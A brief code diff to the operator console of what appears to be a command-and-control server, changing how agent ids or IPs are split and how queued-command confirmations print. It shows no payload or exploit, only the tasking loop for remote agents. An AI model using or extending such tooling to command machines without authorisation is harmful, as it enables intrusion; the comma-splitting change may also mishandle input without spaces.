@@ -178,7 +178,7 @@ def operator_console():
             if len(parts) < 3:
                 print("Usage: task <command> <agent_id|ip>")
                 continue
-            identifiers = parts[2].split(",") # list of ids or ips to queue the command for.
+            identifiers = parts[2].split(", ") # list of ids or ips to queue the command for.
             print("list of identifiers:" + str(identifiers))
             for identifier in identifiers:
                 agent_id = find_agent_by_identifier(identifier)
@@ -191,7 +191,7 @@ def operator_console():
                     COMMANDS.setdefault(agent_id, []).append(command_text)
                     # report back which agent id and ip got the task
                     ip = AGENT_INFO.get(agent_id, {}).get("ip")
-                    print(f"\n[+] Queued command for id={agent_id} ip={ip}: {command_text}")
+                    print(f"[+] Queued command for id={agent_id} ip={ip}: {command_text}")
             continue
 
         if cmd == "results":
